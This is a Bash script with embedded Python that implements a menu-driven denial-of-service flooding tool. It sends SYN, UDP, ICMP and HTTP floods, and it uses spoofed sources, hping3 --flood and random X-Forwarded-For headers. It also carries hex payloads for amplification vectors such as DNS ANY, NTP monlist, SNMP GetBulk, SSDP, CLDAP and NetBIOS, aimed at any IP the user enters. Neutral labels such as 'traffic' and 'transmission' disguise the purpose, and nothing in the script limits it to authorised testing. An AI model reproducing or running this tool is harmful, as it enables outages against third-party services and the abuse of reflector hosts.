#!/usr/bin/env bash
set -uo pipefail

C_RESET='\033[0m'
C_BOLD='\033[1m'
C_RED='\033[0;31m'
C_GREEN='\033[0;32m'
C_YELLOW='\033[1;33m'
C_CYAN='\033[0;36m'

TARGET_IP="${TARGET_IP:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-80}"
DURATION="${DURATION:-30}"
THREADS="${THREADS:-8}"

HAS_HPING=false
HAS_PYTHON=false
HAS_CURL=false

command -v hping3  &>/dev/null && HAS_HPING=true
command -v python3 &>/dev/null && HAS_PYTHON=true
command -v curl    &>/dev/null && HAS_CURL=true

log_info()    { echo -e "${C_CYAN}[*]${C_RESET} $*"; }
log_success() { echo -e "${C_GREEN}[+]${C_RESET} $*"; }
log_warn()    { echo -e "${C_YELLOW}[!]${C_RESET} $*"; }
log_err()     { echo -e "${C_RED}[-]${C_RESET} $*"; }

send_stream() {
    local ip=$1 port=$2 proto=$3 payload_hex=$4 dur=$5
    python3 - "$ip" "$port" "$proto" "$payload_hex" "$dur" "$THREADS" <<'EOF'
import sys, socket, threading, time, random

ip, port, proto, ph, dur, thr = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], int(sys.argv[5]), int(sys.argv[6])
payload = bytes.fromhex(ph) if ph else bytes(random.getrandbits(8) for _ in range(512))
end_time = time.time() + dur
stats = [0]
lock = threading.Lock()

def worker():
    cnt = 0
    if proto == 'udp':
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                s.sendto(payload, (ip, port))
                cnt += 1
            except Exception:
                break
    elif proto == 'tcp':
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.sendall(payload)
                cnt += 1
                s.close()
            except Exception:
                pass
    with lock:
        stats[0] += cnt

workers = [threading.Thread(target=worker, daemon=True) for _ in range(thr)]
for w in workers: w.start()

start = time.time()
while time.time() < end_time:
    elapsed = time.time() - start
    pps = stats[0] / elapsed if elapsed > 0 else 0
    rem = max(0, dur - int(elapsed))
    print(f"\r  {stats[0]:>8,} pkts  |  {pps:>8,.0f} pps  |  {rem:>3}s remaining", end='', flush=True)
    time.sleep(0.5)

for w in workers: w.join(timeout=1.5)
print(f"\r  Finished: {stats[0]:,} pkts sent over {dur}s                                ")
EOF
}

send_http() {
    local url=$1 dur=$2
    python3 - "$url" "$dur" "$THREADS" <<'EOF'
import sys, threading, time, subprocess, random

url, dur, thr = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
end_time = time.time() + dur
stats = [0]
lock = threading.Lock()

def rand_ip():
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

def worker():
    cnt = 0
    while time.time() < end_time:
        try:
            subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '--max-time', '2',
                 '-H', f'X-Forwarded-For: {rand_ip()}',
                 '-H', 'User-Agent: Mozilla/5.0', url],
                capture_output=True, timeout=3
            )
            cnt += 1
        except Exception:
            pass
    with lock:
        stats[0] += cnt

workers = [threading.Thread(target=worker, daemon=True) for _ in range(thr)]
for w in workers: w.start()

start = time.time()
while time.time() < end_time:
    elapsed = time.time() - start
    rps = stats[0] / elapsed if elapsed > 0 else 0
    rem = max(0, dur - int(elapsed))
    print(f"\r  {stats[0]:>8,} requests  |  {rps:>6.1f} req/s  |  {rem:>3}s remaining", end='', flush=True)
    time.sleep(0.5)

for w in workers: w.join(timeout=1.5)
print(f"\r  Finished: {stats[0]:,} requests completed                                   ")
EOF
}

select_syn() {
    log_info "Traffic: SYN [TCP] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    if $HAS_HPING; then
        sudo hping3 -S --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" &
        local pid=$!
        sleep "$DURATION"
        kill "$pid" 2>/dev/null || true
    else
        send_stream "$TARGET_IP" "$TARGET_PORT" tcp "" "$DURATION"
    fi
}

select_udp() {
    log_info "Traffic: UDP [UDP] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    if $HAS_HPING; then
        sudo hping3 --udp --flood --rand-source -p "$TARGET_PORT" "$TARGET_IP" &
        local pid=$!
        sleep "$DURATION"
        kill "$pid" 2>/dev/null || true
    else
        send_stream "$TARGET_IP" "$TARGET_PORT" udp "" "$DURATION"
    fi
}

select_udplag() {
    log_info "Traffic: UDP-Lag [UDP 1400B] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local payload
    payload=$(python3 -c "print('aa' * 1400)")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$payload" "$DURATION"
}

select_icmp() {
    log_info "Traffic: ICMP [Ping] -> $TARGET_IP ($DURATION s)"
    if $HAS_HPING; then
        sudo hping3 --icmp --flood --rand-source "$TARGET_IP" &
        local pid=$!
        sleep "$DURATION"
        kill "$pid" 2>/dev/null || true
    else
        send_stream "$TARGET_IP" 0 udp "$(python3 -c "print('0800' + '00'*30)")" "$DURATION"
    fi
}

select_dns() {
    log_info "Traffic: DNS [UDP 53] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="dead010000010000000000000667006f6f676c6503636f6d0000ff0001"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ntp() {
    log_info "Traffic: NTP Monlist [UDP 123] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="1700032a$(python3 -c "print('00'*44)")"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_snmp() {
    log_info "Traffic: SNMP GetBulk [UDP 161] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="302e02010104067075626c6963a51f0204574571de020100020164301330110603550403060a2b060102010100000500"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ssdp() {
    log_info "Traffic: SSDP M-SEARCH [UDP 1900] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt
    pkt=$(python3 -c "print('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'.encode().hex())")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ldap() {
    log_info "Traffic: CLDAP [UDP 389] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="3025020101632004000a01000a0100020100020100010100870b6f626a656374636c6173733000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_mssql() {
    log_info "Traffic: MSSQL Browser [UDP 1434] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="02"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_netbios() {
    log_info "Traffic: NetBIOS NS [UDP 137] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="a14e010000010000000000002046484546464345454e454341434143414341434143414341434143414341434100002000010000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_portmap() {
    log_info "Traffic: Portmap RPC [UDP 111] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="724f2a920000000000000002000186a00000000200000004000000000000000000000000000000000000000000000000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_tftp() {
    log_info "Traffic: TFTP RRQ [UDP 69] -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt
    pkt=$(python3 -c "import sys; sys.stdout.write(b'\x00\x01/etc/passwd\x00octet\x00'.hex())")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_http() {
    log_info "Traffic: HTTP [TCP $TARGET_PORT] -> http://$TARGET_IP:$TARGET_PORT/ ($DURATION s)"
    send_http "http://$TARGET_IP:$TARGET_PORT/" "$DURATION"
}

LABELS=(
    ""
    "SYN"
    "UDP"
    "UDP-Lag"
    "ICMP"
    "DNS"
    "NTP"
    "SNMP"
    "SSDP"
    "LDAP"
    "MSSQL"
    "NetBIOS"
    "Portmap"
    "TFTP"
    "HTTP"
)

PORTS=(
    0
    80     # 1: SYN
    80     # 2: UDP
    80     # 3: UDP-Lag
    0      # 4: ICMP
    53     # 5: DNS
    123    # 6: NTP
    161    # 7: SNMP
    1900   # 8: SSDP
    389    # 9: LDAP
    1434   # 10: MSSQL
    137    # 11: NetBIOS
    111    # 12: Portmap
    69     # 13: TFTP
    80     # 14: HTTP
)

show_menu() {
    echo -e "${C_BOLD}  Select Traffic Type:${C_RESET}"
    echo -e "  ┌────┬───────────────────────┬────┬───────────────────────┐"
    echo -e "  │ ${C_CYAN} 1${C_RESET} │ SYN [Port 80]         │ ${C_CYAN} 8${C_RESET} │ SSDP [Port 1900]      │"
    echo -e "  │ ${C_CYAN} 2${C_RESET} │ UDP [Port 80]         │ ${C_CYAN} 9${C_RESET} │ LDAP [Port 389]       │"
    echo -e "  │ ${C_CYAN} 3${C_RESET} │ UDP-Lag [Port 80]     │ ${C_CYAN}10${C_RESET} │ MSSQL [Port 1434]     │"
    echo -e "  │ ${C_CYAN} 4${C_RESET} │ ICMP [Ping]           │ ${C_CYAN}11${C_RESET} │ NetBIOS [Port 137]    │"
    echo -e "  │ ${C_CYAN} 5${C_RESET} │ DNS [Port 53]         │ ${C_CYAN}12${C_RESET} │ Portmap [Port 111]    │"
    echo -e "  │ ${C_CYAN} 6${C_RESET} │ NTP [Port 123]        │ ${C_CYAN}13${C_RESET} │ TFTP [Port 69]        │"
    echo -e "  │ ${C_CYAN} 7${C_RESET} │ SNMP [Port 161]       │ ${C_CYAN}14${C_RESET} │ HTTP [Port 80]        │"
    echo -e "  └────┴───────────────────────┴────┴───────────────────────┘"
}

run_selection() {
    local choice="$1"
    case "$choice" in
        1)  select_syn     ;;
        2)  select_udp     ;;
        3)  select_udplag  ;;
        4)  select_icmp    ;;
        5)  select_dns     ;;
        6)  select_ntp     ;;
        7)  select_snmp    ;;
        8)  select_ssdp    ;;
        9)  select_ldap    ;;
        10) select_mssql   ;;
        11) select_netbios ;;
        12) select_portmap ;;
        13) select_tftp    ;;
        14) select_http    ;;
        *)  log_err "Invalid selection: $choice"; exit 1 ;;
    esac
}

main() {
    local choice
    local in_ip in_dur

    if [[ "${1:-}" =~ ^[0-9]+$ ]]; then
        choice=$1
        [[ -n "${2:-}" ]] && TARGET_IP=$2
        TARGET_PORT=${PORTS[$choice]}
        [[ -n "${3:-}" ]] && TARGET_PORT=$3
        [[ -n "${4:-}" ]] && DURATION=$4
    else
        show_menu
        echo ""
        read -rp "  Option [1-14]: " choice
        
        if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt 14 ]; then
            log_err "Lựa chọn không hợp lệ (1-14)."
            exit 1
        fi

        TARGET_PORT=${PORTS[$choice]}

        read -rp "  Target IP [${TARGET_IP}]: " in_ip
        read -rp "  Duration(s) [${DURATION}]: " in_dur

        [[ -n "${in_ip:-}"  ]] && TARGET_IP=$in_ip
        [[ -n "${in_dur:-}" ]] && DURATION=$in_dur
    fi

    echo ""
    echo -e "  Traffic  : ${C_BOLD}${LABELS[$choice]}${C_RESET}"
    echo -e "  Endpoint : ${C_BOLD}${TARGET_IP}:${TARGET_PORT}${C_RESET}"
    echo -e "  Duration : ${C_BOLD}${DURATION}s${C_RESET} | Threads: ${C_BOLD}${THREADS}${C_RESET}"
    echo ""
    log_warn "Starting transmission in 2 seconds (Ctrl+C to abort)..."
    sleep 2

    run_selection "$choice"

    echo ""
    log_success "Transmission completed."
}

main "${@:-}"
